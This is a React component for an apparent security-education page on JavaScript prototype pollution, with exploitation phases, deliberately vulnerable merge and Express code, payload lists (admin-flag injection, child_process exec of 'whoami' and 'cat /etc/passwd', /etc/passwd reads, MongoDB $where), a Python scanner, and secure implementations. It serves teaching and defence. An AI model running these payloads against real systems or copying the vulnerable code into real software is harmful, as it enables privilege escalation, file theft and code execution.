
import React from 'react';
import { Code } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const PrototypePollution: React.FC = () => {
  return (
    <section id="prototype" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">Prototype Pollution</h3>
      
      {/* Introduction */}
      <div className="mb-8">
        <p className="mb-6">
          Prototype pollution is a JavaScript vulnerability that occurs when an attacker is able to modify the 
          prototype of a base object, such as Object.prototype. This can lead to property injection in all objects, 
          potentially causing denial of service, remote code execution, or bypassing security mechanisms.
        </p>
      </div>

      {/* What Attackers Try to Achieve */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">What Attackers Try to Achieve</h4>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>Property Injection:</strong> Add malicious properties to all objects in the application</li>
          <li><strong>Authentication Bypass:</strong> Inject admin flags or privileges into user objects</li>
          <li><strong>Remote Code Execution:</strong> Pollute properties used in dangerous functions like eval() or exec()</li>
          <li><strong>Denial of Service:</strong> Crash applications by polluting critical prototype properties</li>
          <li><strong>Security Bypass:</strong> Override security checks by polluting validation properties</li>
          <li><strong>Configuration Manipulation:</strong> Modify application configuration through prototype pollution</li>
          <li><strong>Template Injection:</strong> Exploit server-side template engines through polluted properties</li>
        </ul>
      </div>

      {/* Vulnerable Components */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>Object Merge Functions:</strong> Libraries that recursively merge objects (lodash.merge, jQuery.extend)</li>
          <li><strong>JSON Parsing:</strong> Deep cloning or merging of JSON data from user input</li>
          <li><strong>Configuration Parsers:</strong> YAML, TOML, or custom configuration file parsers</li>
          <li><strong>Template Engines:</strong> Handlebars, Mustache, Pug when processing user data</li>
          <li><strong>ORM Libraries:</strong> Object-relational mapping tools that merge user input</li>
          <li><strong>HTTP Request Parsers:</strong> Body parsers that handle nested object structures</li>
          <li><strong>Utility Libraries:</strong> Any library performing deep object operations</li>
        </ul>
      </div>

      {/* Why These Attacks Work */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Why Prototype Pollution Attacks Work</h4>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>JavaScript Inheritance:</strong> All objects inherit from Object.prototype by default</li>
          <li><strong>Property Resolution:</strong> JavaScript checks prototype chain when properties are undefined</li>
          <li><strong>Reference vs Value:</strong> Prototype modifications affect all existing and future objects</li>
          <li><strong>Recursive Merging:</strong> Deep merge operations can traverse to __proto__ without proper validation</li>
          <li><strong>JSON.parse Behavior:</strong> JSON parsing preserves special property names like __proto__</li>
          <li><strong>Weak Type Checking:</strong> JavaScript's dynamic nature allows unexpected property access</li>
          <li><strong>Framework Assumptions:</strong> Many frameworks assume object properties are safe</li>
        </ul>
      </div>

      {/* How Prototype Pollution Works */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">How Prototype Pollution Works</h4>
        <p className="mb-4">
          In JavaScript, all objects inherit properties from their prototype. When an attacker can modify the prototype
          (typically Object.prototype), they can inject properties that will be present on all objects, potentially
          affecting application logic and security throughout the entire application.
        </p>
        
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <p className="font-semibold mb-2">Pollution Vectors:</p>
          <ul className="list-disc pl-4 text-sm">
            <li><strong>__proto__:</strong> Direct prototype reference (deprecated but still functional)</li>
            <li><strong>constructor.prototype:</strong> Access through constructor property</li>
            <li><strong>Recursive Property Access:</strong> Deep object traversal reaching prototype chain</li>
            <li><strong>Array Index Pollution:</strong> Using array indices to pollute Array.prototype</li>
          </ul>
        </div>
      </div>

      {/* Step-by-Step Exploitation */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Step-by-Step Exploitation Process</h4>
        
        <h5 className="text-lg font-medium mb-3">Phase 1: Discovery and Analysis</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li>Identify endpoints that accept nested JSON objects or form data</li>
          <li>Look for object merging, cloning, or deep assignment operations</li>
          <li>Analyze client-side JavaScript for vulnerable merge functions</li>
          <li>Check for configuration endpoints that process object structures</li>
          <li>Identify template engines or dynamic property access patterns</li>
        </ol>

        <h5 className="text-lg font-medium mb-3">Phase 2: Pollution Testing</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li>Test __proto__ pollution with simple payloads</li>
          <li>Try constructor.prototype pollution vectors</li>
          <li>Test different property names and values</li>
          <li>Verify pollution by checking for injected properties</li>
          <li>Test pollution persistence across requests</li>
        </ol>

        <h5 className="text-lg font-medium mb-3">Phase 3: Impact Assessment</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li>Identify which application features are affected</li>
          <li>Test for authentication and authorization bypass</li>
          <li>Look for code execution opportunities</li>
          <li>Check for denial of service possibilities</li>
          <li>Document the scope of the pollution impact</li>
        </ol>
      </div>

      {/* Vulnerable Code Examples */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Vulnerable Code Examples</h4>
        
        <CodeExample 
          language="javascript" 
          isVulnerable={true}
          title="Vulnerable Recursive Merge Function" 
          code={`// Vulnerable merge implementation
function vulnerableMerge(target, source) {
  for (let key in source) {
    if (key in source && typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      
      // Vulnerable: No protection against __proto__ or constructor
      vulnerableMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Example of vulnerable usage
const userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
const config = {};
vulnerableMerge(config, userInput);

// Now ALL objects have isAdmin = true
console.log({}.isAdmin); // true - POLLUTED!

// Real-world exploitation example
function authenticateUser(user) {
  if (user.isAdmin) {
    return { role: 'admin', permissions: ['all'] };
  }
  return { role: 'user', permissions: ['read'] };
}

const normalUser = { username: 'john' };
console.log(authenticateUser(normalUser)); // { role: 'admin', permissions: ['all'] }
`} 
        />

        <CodeExample 
          language="javascript" 
          isVulnerable={true}
          title="Vulnerable Express.js Route Handler" 
          code={`const express = require('express');
const app = express();

app.use(express.json());

// Vulnerable: Direct merge of user input
function updateUserSettings(userId, settings) {
  const user = getUserById(userId);
  
  // Vulnerable merge operation
  for (let key in settings) {
    if (typeof settings[key] === 'object' && settings[key] !== null) {
      if (!user[key]) user[key] = {};
      
      // Recursive merge without protection
      Object.assign(user[key], settings[key]);
    } else {
      user[key] = settings[key];
    }
  }
  
  return user;
}

app.post('/api/user/settings', (req, res) => {
  const userId = req.user.id;
  const settings = req.body; // User-controlled input
  
  // This can be exploited with:
  // {"__proto__": {"isAdmin": true}}
  // or
  // {"constructor": {"prototype": {"isAdmin": true}}}
  
  const updatedUser = updateUserSettings(userId, settings);
  res.json(updatedUser);
});

// Vulnerable authorization check
app.get('/api/admin/users', (req, res) => {
  const user = req.user;
  
  // After prototype pollution, this check can be bypassed
  if (user.isAdmin) {
    res.json(getAllUsers());
  } else {
    res.status(403).json({ error: 'Access denied' });
  }
});`} 
        />

        <CodeExample 
          language="javascript" 
          isVulnerable={true}
          title="Vulnerable Template Engine Usage" 
          code={`const Handlebars = require('handlebars');

// Vulnerable template compilation with user data
function renderTemplate(templateString, userData) {
  const template = Handlebars.compile(templateString);
  
  // User data can pollute the prototype
  const context = {};
  deepMerge(context, userData); // Vulnerable merge
  
  return template(context);
}

// Exploitation scenario
const maliciousUserData = {
  name: "John",
  "__proto__": {
    "type": "constructor",
    "constructor": {
      "__proto__": {
        "runScript": "require('child_process').exec('whoami')"
      }
    }
  }
};

// Template that becomes vulnerable after pollution
const template = "Hello {{name}}! {{#if runScript}}{{runScript}}{{/if}}";

// This could lead to RCE
const result = renderTemplate(template, maliciousUserData);

// Another RCE vector through template helpers pollution
const maliciousData = {
  "__proto__": {
    "blockHelperMissing": function() {
      return require('child_process').execSync('cat /etc/passwd').toString();
    }
  }
};`} 
        />
      </div>

      {/* Example Attack Payloads */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Example Attack Payloads</h4>
        
        <h5 className="text-lg font-medium mb-3">Basic Prototype Pollution Payloads</h5>
        <CodeExample 
          language="json" 
          isVulnerable={true}
          title="Common Pollution Payloads" 
          code={`// Basic __proto__ pollution
{
  "__proto__": {
    "isAdmin": true,
    "role": "admin"
  }
}

// Constructor-based pollution
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}

// Deep nested pollution
{
  "user": {
    "profile": {
      "__proto__": {
        "permissions": ["read", "write", "admin"]
      }
    }
  }
}

// Array prototype pollution
{
  "__proto__": {
    "length": 0
  }
}

// Function prototype pollution for RCE
{
  "__proto__": {
    "toString": "function(){return require('child_process').exec('whoami')}"
  }
}

// Template engine exploitation
{
  "__proto__": {
    "blockHelperMissing": "{{#exec}}cat /etc/passwd{{/exec}}"
  }
}

// Configuration pollution
{
  "__proto__": {
    "debug": true,
    "logLevel": "trace",
    "allowUnsafeEval": true
  }
}`} 
        />

        <h5 className="text-lg font-medium mb-3">Advanced Exploitation Payloads</h5>
        <CodeExample 
          language="json" 
          isVulnerable={true}
          title="Advanced RCE and DoS Payloads" 
          code={`// Remote Code Execution through template engines
{
  "__proto__": {
    "blockHelperMissing": {
      "toString": "function() { return require('child_process').execSync('whoami').toString(); }"
    }
  }
}

// Denial of Service through infinite recursion
{
  "__proto__": {
    "toString": {
      "toString": "{{#each this}}{{this}}{{/each}}"
    }
  }
}

// Environment variable exposure
{
  "__proto__": {
    "env": "{{process.env}}"
  }
}

// File system access
{
  "__proto__": {
    "readFile": "require('fs').readFileSync('/etc/passwd', 'utf8')"
  }
}

// Express.js specific pollution
{
  "__proto__": {
    "view engine": "ejs",
    "view options": {
      "client": true,
      "escape": false
    }
  }
}

// MongoDB injection through pollution
{
  "__proto__": {
    "$where": "function() { return true; }"
  }
}`} 
        />
      </div>

      {/* Testing Methods */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Testing Methods and Tools</h4>
        
        <h5 className="text-lg font-medium mb-3">Manual Testing Approach</h5>
        <ol className="list-decimal pl-6 space-y-2 mb-4">
          <li><strong>Identify Input Points:</strong> Find endpoints accepting JSON/object data</li>
          <li><strong>Test Basic Pollution:</strong> Send {"__proto__": {"polluted": true}} payloads</li>
          <li><strong>Verify Pollution:</strong> Check if subsequent requests show polluted properties</li>
          <li><strong>Test Impact:</strong> Look for authentication bypass or privilege escalation</li>
          <li><strong>Document Scope:</strong> Identify all affected application areas</li>
        </ol>

        <h5 className="text-lg font-medium mb-3">Automated Testing Tools</h5>
        <CodeExample 
          language="python" 
          title="Prototype Pollution Detection Script" 
          code={`import requests
import json
import uuid

class PrototypePollutionTester:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()
        
    def test_prototype_pollution(self, endpoint, method='POST'):
        """Test for prototype pollution vulnerability"""
        
        # Generate unique marker for pollution detection
        marker = str(uuid.uuid4())
        
        # Various pollution payloads
        payloads = [
            {"__proto__": {"polluted": marker}},
            {"constructor": {"prototype": {"polluted": marker}}},
            {"__proto__": {"isAdmin": True}},
            {"__proto__": {"role": "admin"}},
            {"__proto__": {"authenticated": True}},
        ]
        
        results = []
        
        for payload in payloads:
            try:
                # Send pollution payload
                if method.upper() == 'POST':
                    response = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=payload,
                        headers={'Content-Type': 'application/json'}
                    )
                else:
                    response = self.session.get(
                        f"{self.base_url}{endpoint}",
                        params=payload
                    )
                
                # Test if pollution worked by sending follow-up requests
                test_response = self.test_pollution_effect(marker)
                
                if test_response:
                    results.append({
                        'payload': payload,
                        'endpoint': endpoint,
                        'method': method,
                        'status': 'VULNERABLE',
                        'evidence': test_response
                    })
                    
            except Exception as e:
                print(f"Error testing payload {payload}: {e}")
                
        return results
    
    def test_pollution_effect(self, marker):
        """Test if prototype pollution affected subsequent requests"""
        
        test_endpoints = [
            '/api/user/profile',
            '/api/admin/users',
            '/api/config',
            '/api/status'
        ]
        
        for endpoint in test_endpoints:
            try:
                response = self.session.get(f"{self.base_url}{endpoint}")
                
                if response.status_code == 200:
                    response_text = response.text.lower()
                    
                    # Check for pollution markers
                    if marker.lower() in response_text:
                        return f"Pollution detected in {endpoint}: {marker}"
                    
                    # Check for privilege escalation indicators
                    admin_indicators = ['admin', 'administrator', 'root', 'superuser']
                    if any(indicator in response_text for indicator in admin_indicators):
                        return f"Potential privilege escalation in {endpoint}"
                        
            except Exception as e:
                continue
                
        return None
    
    def test_specific_vulnerabilities(self):
        """Test for specific prototype pollution impacts"""
        
        tests = [
            # Authentication bypass test
            {
                'name': 'Authentication Bypass',
                'payload': {"__proto__": {"isAdmin": True, "authenticated": True}},
                'test_endpoint': '/api/admin/users'
            },
            
            # Template injection test
            {
                'name': 'Template Injection',
                'payload': {"__proto__": {"blockHelperMissing": "{{7*7}}"}},
                'test_endpoint': '/api/render'
            },
            
            # Configuration pollution test
            {
                'name': 'Configuration Pollution',
                'payload': {"__proto__": {"debug": True, "logLevel": "trace"}},
                'test_endpoint': '/api/config'
            }
        ]
        
        results = []
        
        for test in tests:
            try:
                # Send pollution payload
                response = self.session.post(
                    f"{self.base_url}/api/settings",
                    json=test['payload']
                )
                
                # Test the specific vulnerability
                test_response = self.session.get(
                    f"{self.base_url}{test['test_endpoint']}"
                )
                
                if test_response.status_code == 200:
                    results.append({
                        'test': test['name'],
                        'status': 'POTENTIALLY_VULNERABLE',
                        'response': test_response.text[:200]
                    })
                    
            except Exception as e:
                print(f"Error in {test['name']} test: {e}")
                
        return results

# Usage example
tester = PrototypePollutionTester("https://target-app.com")

# Test common endpoints
endpoints_to_test = [
    '/api/user/settings',
    '/api/profile/update',
    '/api/config/update',
    '/api/data/merge'
]

for endpoint in endpoints_to_test:
    results = tester.test_prototype_pollution(endpoint)
    for result in results:
        print(f"FOUND: {result}")

# Test specific vulnerability scenarios
specific_results = tester.test_specific_vulnerabilities()
for result in specific_results:
    print(f"SPECIFIC TEST: {result}")`} 
        />

        <h5 className="text-lg font-medium mb-3">Browser-Based Testing</h5>
        <CodeExample 
          language="javascript" 
          title="Client-Side Pollution Detection" 
          code={`// Client-side prototype pollution detection
function detectPrototypePollution() {
  const testKey = 'pollutionTest' + Math.random();
  const testValue = 'POLLUTED_' + Date.now();
  
  // Test current pollution state
  if ({}[testKey] !== undefined) {
    console.log('Prototype pollution already detected!');
    return true;
  }
  
  // Test various pollution vectors
  const pollutionTests = [
    // Direct __proto__ access
    () => {
      try {
        const obj = {};
        obj.__proto__[testKey] = testValue;
        return {}[testKey] === testValue;
      } catch (e) {
        return false;
      }
    },
    
    // Constructor.prototype access
    () => {
      try {
        const obj = {};
        obj.constructor.prototype[testKey] = testValue;
        return {}[testKey] === testValue;
      } catch (e) {
        return false;
      }
    },
    
    // JSON.parse pollution
    () => {
      try {
        const malicious = \`{"\${testKey}": "\${testValue}", "__proto__": {"\${testKey}": "\${testValue}"}}\`;
        JSON.parse(malicious);
        return {}[testKey] === testValue;
      } catch (e) {
        return false;
      }
    }
  ];
  
  for (let i = 0; i < pollutionTests.length; i++) {
    if (pollutionTests[i]()) {
      console.log(\`Prototype pollution possible via method \${i + 1}\`);
      
      // Clean up test pollution
      delete Object.prototype[testKey];
      return true;
    }
  }
  
  return false;
}

// Test for existing pollution
function checkExistingPollution() {
  const commonPollutionKeys = [
    'isAdmin', 'admin', 'role', 'authenticated', 'permissions',
    'debug', 'dev', 'test', 'polluted', 'constructor'
  ];
  
  const pollutedKeys = [];
  
  for (const key of commonPollutionKeys) {
    if ({}[key] !== undefined) {
      pollutedKeys.push({
        key: key,
        value: {}[key]
      });
    }
  }
  
  if (pollutedKeys.length > 0) {
    console.log('Existing prototype pollution detected:', pollutedKeys);
    return pollutedKeys;
  }
  
  return null;
}

// Advanced pollution impact testing
function testPollutionImpact() {
  const impacts = [];
  
  // Test authentication bypass
  if ({}.isAdmin || {}.admin || {}.role === 'admin') {
    impacts.push('Authentication bypass possible');
  }
  
  // Test for dangerous functions
  if (typeof {}.eval === 'function' || typeof {}.exec === 'function') {
    impacts.push('Code execution risk');
  }
  
  // Test for configuration pollution
  if ({}.debug === true || {}.devMode === true) {
    impacts.push('Configuration manipulation detected');
  }
  
  return impacts;
}

// Run tests
console.log('Testing for prototype pollution...');
const canPollute = detectPrototypePollution();
const existingPollution = checkExistingPollution();
const impacts = testPollutionImpact();

console.log('Results:', {
  canPollute,
  existingPollution,
  impacts
});`} 
        />
      </div>

      {/* Secure Implementation */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Secure Implementation Examples</h4>
        
        <CodeExample 
          language="javascript" 
          isVulnerable={false}
          title="Secure Object Merging Implementation" 
          code={`// Method 1: Safe merge with property filtering
function secureMerge(target, source, maxDepth = 5, currentDepth = 0) {
  // Prevent deep recursion attacks
  if (currentDepth > maxDepth) {
    throw new Error('Maximum merge depth exceeded');
  }
  
  // Dangerous properties to block
  const dangerousProps = ['__proto__', 'constructor', 'prototype'];
  
  for (let key in source) {
    // Skip inherited properties
    if (!source.hasOwnProperty(key)) {
      continue;
    }
    
    // Block dangerous property names
    if (dangerousProps.includes(key)) {
      console.warn(\`Blocked dangerous property: \${key}\`);
      continue;
    }
    
    // Additional key validation
    if (typeof key !== 'string' || key.length > 100) {
      console.warn(\`Invalid property key: \${key}\`);
      continue;
    }
    
    if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
      // Ensure target property exists and is an object
      if (!target[key] || typeof target[key] !== 'object') {
        target[key] = {};
      }
      
      // Recursive merge with depth tracking
      secureMerge(target[key], source[key], maxDepth, currentDepth + 1);
    } else {
      // Validate value before assignment
      if (isValidValue(source[key])) {
        target[key] = source[key];
      }
    }
  }
  
  return target;
}

function isValidValue(value) {
  // Add value validation logic
  if (typeof value === 'string' && value.length > 1000) {
    return false; // Prevent extremely long strings
  }
  
  if (typeof value === 'function') {
    return false; // Never allow function injection
  }
  
  return true;
}

// Method 2: Use Object.create(null) for prototype-free objects
function createSafeObject(data) {
  // Create object with no prototype
  const safeObject = Object.create(null);
  
  // Copy only own properties
  for (const key of Object.keys(data)) {
    if (typeof key === 'string' && !key.startsWith('__')) {
      safeObject[key] = data[key];
    }
  }
  
  return safeObject;
}

// Method 3: Using JSON parse/stringify for safe cloning
function safeClone(obj) {
  try {
    // This removes functions and prototype pollution
    return JSON.parse(JSON.stringify(obj));
  } catch (e) {
    throw new Error('Invalid object for cloning');
  }
}

// Method 4: Schema-based validation
const Joi = require('joi');

const userSettingsSchema = Joi.object({
  name: Joi.string().max(50),
  email: Joi.string().email(),
  preferences: Joi.object({
    theme: Joi.string().valid('light', 'dark'),
    notifications: Joi.boolean()
  }).max(10) // Limit number of properties
}).unknown(false); // Reject unknown properties

function updateUserSettingsSecurely(userId, settings) {
  // Validate against schema first
  const { error, value } = userSettingsSchema.validate(settings);
  
  if (error) {
    throw new Error(\`Invalid settings: \${error.message}\`);
  }
  
  const user = getUserById(userId);
  
  // Use validated data for merge
  return secureMerge(user, value);
}`} 
        />

        <CodeExample 
          language="javascript" 
          isVulnerable={false}
          title="Secure Express.js Implementation" 
          code={`const express = require('express');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');

const app = express();

// Security middleware
app.use(helmet());
app.use(express.json({ 
  limit: '10mb',
  // Custom reviver to prevent prototype pollution
  reviver: (key, value) => {
    // Block dangerous keys
    if (key === '__proto__' || key === 'constructor') {
      return undefined;
    }
    return value;
  }
}));

// Rate limiting
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});
app.use(limiter);

// Secure settings update endpoint
app.post('/api/user/settings', [
  // Input validation middleware
  (req, res, next) => {
    const allowedKeys = ['name', 'email', 'preferences', 'profile'];
    const dangerousKeys = ['__proto__', 'constructor', 'prototype'];
    
    function validateObject(obj, path = '') {
      for (const key in obj) {
        if (!obj.hasOwnProperty(key)) continue;
        
        // Check for dangerous keys
        if (dangerousKeys.includes(key)) {
          return res.status(400).json({
            error: \`Dangerous property detected: \${path}\${key}\`
          });
        }
        
        // Validate key format
        if (typeof key !== 'string' || !/^[a-zA-Z0-9_-]+$/.test(key)) {
          return res.status(400).json({
            error: \`Invalid property name: \${path}\${key}\`
          });
        }
        
        // Recursive validation for nested objects
        if (obj[key] && typeof obj[key] === 'object' && !Array.isArray(obj[key])) {
          const result = validateObject(obj[key], \`\${path}\${key}.\`);
          if (result) return result;
        }
      }
      return null;
    }
    
    const validationError = validateObject(req.body);
    if (validationError) return validationError;
    
    next();
  }
], (req, res) => {
  try {
    const userId = req.user.id;
    const settings = req.body;
    
    // Create safe object without prototype
    const safeSettings = Object.create(null);
    
    // Whitelist-based property copying
    const allowedProperties = ['name', 'email', 'preferences'];
    
    for (const prop of allowedProperties) {
      if (settings.hasOwnProperty(prop)) {
        safeSettings[prop] = sanitizeValue(settings[prop]);
      }
    }
    
    // Update user with safe settings
    const updatedUser = updateUserSettings(userId, safeSettings);
    
    res.json({
      success: true,
      user: sanitizeUserForResponse(updatedUser)
    });
    
  } catch (error) {
    console.error('Settings update error:', error);
    res.status(500).json({
      error: 'Failed to update settings'
    });
  }
});

function sanitizeValue(value) {
  if (typeof value === 'string') {
    // Remove potentially dangerous characters
    return value.replace(/[<>'"]/g, '');
  }
  
  if (typeof value === 'object' && value !== null) {
    const clean = {};
    for (const key in value) {
      if (value.hasOwnProperty(key) && typeof key === 'string') {
        clean[key] = sanitizeValue(value[key]);
      }
    }
    return clean;
  }
  
  return value;
}

function sanitizeUserForResponse(user) {
  // Only return safe properties
  return {
    id: user.id,
    name: user.name,
    email: user.email,
    createdAt: user.createdAt
  };
}

// Secure authorization middleware
function requireAuth(req, res, next) {
  // Never rely on polluted properties for auth
  const authHeader = req.headers.authorization;
  
  if (!authHeader) {
    return res.status(401).json({ error: 'Authentication required' });
  }
  
  try {
    const token = authHeader.split(' ')[1];
    const user = jwt.verify(token, process.env.JWT_SECRET);
    
    // Explicitly set user properties (don't trust prototype)
    req.user = {
      id: user.id,
      role: user.role || 'user',
      permissions: user.permissions || []
    };
    
    next();
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
}

// Secure admin check
function requireAdmin(req, res, next) {
  // Explicit admin check - never rely on prototype properties
  if (!req.user || req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Admin access required' });
  }
  next();
}

app.get('/api/admin/users', requireAuth, requireAdmin, (req, res) => {
  // This endpoint is now secure against prototype pollution bypass
  res.json(getAllUsers());
});`} 
        />
      </div>

      {/* Prevention Strategies */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Prevention Strategies</h4>
        
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div>
            <h5 className="text-lg font-semibold mb-3">Input Validation</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li>Implement strict property name validation</li>
              <li>Use schema validation libraries (Joi, Yup, etc.)</li>
              <li>Whitelist allowed properties instead of blacklisting</li>
              <li>Validate object depth and structure</li>
              <li>Sanitize user input before processing</li>
              <li>Use Object.hasOwnProperty() checks</li>
              <li>Implement size limits for objects and strings</li>
            </ul>
          </div>
          
          <div>
            <h5 className="text-lg font-semibold mb-3">Safe Object Handling</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li>Use Object.create(null) for prototype-free objects</li>
              <li>Implement secure merge functions with filtering</li>
              <li>Use Map instead of objects for key-value storage</li>
              <li>Freeze Object.prototype (may break some apps)</li>
              <li>Use JSON.parse/stringify for safe cloning</li>
              <li>Avoid recursive merge operations on user input</li>
              <li>Use libraries with built-in pollution protection</li>
            </ul>
          </div>
          
          <div>
            <h5 className="text-lg font-semibold mb-3">Code Security</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li>Never use eval() or similar dynamic execution</li>
              <li>Implement explicit authorization checks</li>
              <li>Use strict CSP headers</li>
              <li>Regularly audit dependencies for vulnerabilities</li>
              <li>Use static analysis tools</li>
              <li>Implement proper error handling</li>
              <li>Use TypeScript for better type safety</li>
            </ul>
          </div>
          
          <div>
            <h5 className="text-lg font-semibold mb-3">Runtime Protection</h5>
            <ul className="list-disc pl-6 space-y-1">
              <li>Monitor for prototype modifications</li>
              <li>Implement runtime property validation</li>
              <li>Use process isolation where possible</li>
              <li>Implement logging for suspicious activities</li>
              <li>Use security linters and code analysis</li>
              <li>Regular security testing and code review</li>
              <li>Keep dependencies updated</li>
            </ul>
          </div>
        </div>
      </div>

      {/* Environment-Specific Considerations */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Environment-Specific Considerations</h4>
        
        <h5 className="text-lg font-medium mb-3">Node.js Applications</h5>
        <ul className="list-disc pl-6 space-y-2 mb-4">
          <li><strong>Express.js:</strong> Be careful with body parsing middleware and custom merge functions</li>
          <li><strong>Template Engines:</strong> Handlebars, Pug, and EJS can be exploited through polluted properties</li>
          <li><strong>ORM Libraries:</strong> Mongoose, Sequelize may be vulnerable to pollution in query building</li>
          <li><strong>Config Libraries:</strong> Libraries like `config` or `dotenv` may expose pollution vectors</li>
        </ul>

        <h5 className="text-lg font-medium mb-3">Client-Side JavaScript</h5>
        <ul className="list-disc pl-6 space-y-2 mb-4">
          <li><strong>Framework Impact:</strong> React, Vue, Angular may behave unexpectedly with polluted prototypes</li>
          <li><strong>State Management:</strong> Redux, Vuex stores may be affected by prototype pollution</li>
          <li><strong>API Communication:</strong> Axios, Fetch wrappers may inherit polluted properties</li>
          <li><strong>Build Tools:</strong> Webpack, Rollup configurations may be vulnerable during build</li>
        </ul>

        <h5 className="text-lg font-medium mb-3">Different JavaScript Engines</h5>
        <ul className="list-disc pl-6 space-y-2">
          <li><strong>V8 (Chrome/Node.js):</strong> Modern versions have some protections but still vulnerable</li>
          <li><strong>SpiderMonkey (Firefox):</strong> Different behavior with __proto__ handling</li>
          <li><strong>JavaScriptCore (Safari):</strong> May have different prototype chain behaviors</li>
          <li><strong>Legacy Browsers:</strong> May be more vulnerable due to lack of modern protections</li>
        </ul>
      </div>

      {/* Special Cases and Advanced Scenarios */}
      <div className="mb-8">
        <h4 className="text-xl font-semibold mb-4">Special Cases and Advanced Scenarios</h4>
        
        <h5 className="text-lg font-medium mb-3">Server-Side Template Injection via Pollution</h5>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <p className="font-semibold mb-2">Scenario:</p>
          <p className="text-sm mb-2">
            Template engines often check prototype properties when resolving template variables, 
            making them vulnerable to RCE through prototype pollution.
          </p>
          <CodeExample 
            language="javascript" 
            title="SSTI via Prototype Pollution" 
            code={`// Pollution payload
{"__proto__": {"blockHelperMissing": "require('child_process').execSync('whoami')"}}

// Template that becomes vulnerable
{{#each users}}{{name}}{{/each}} // Triggers blockHelperMissing`} 
          />
        </div>

        <h5 className="text-lg font-medium mb-3">NoSQL Injection via Pollution</h5>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <p className="font-semibold mb-2">MongoDB Query Pollution:</p>
          <CodeExample 
            language="javascript" 
            title="NoSQL Injection through Pollution" 
            code={`// Pollution payload
{"__proto__": {"$where": "function() { return true; }"}}

// Query becomes vulnerable
db.users.find({username: user.username}) // Inherits $where from prototype`} 
          />
        </div>

        <h5 className="text-lg font-medium mb-3">Timing-Based Detection</h5>
        <div className="bg-cybr-muted/30 p-4 rounded-lg mb-4">
          <p className="font-semibold mb-2">Advanced Detection Technique:</p>
          <p className="text-sm">
            Some applications may not immediately show pollution effects. Use timing attacks 
            or delayed payloads to detect successful pollution.
          </p>
        </div>
      </div>
    </section>
  );
};

export default PrototypePollution;
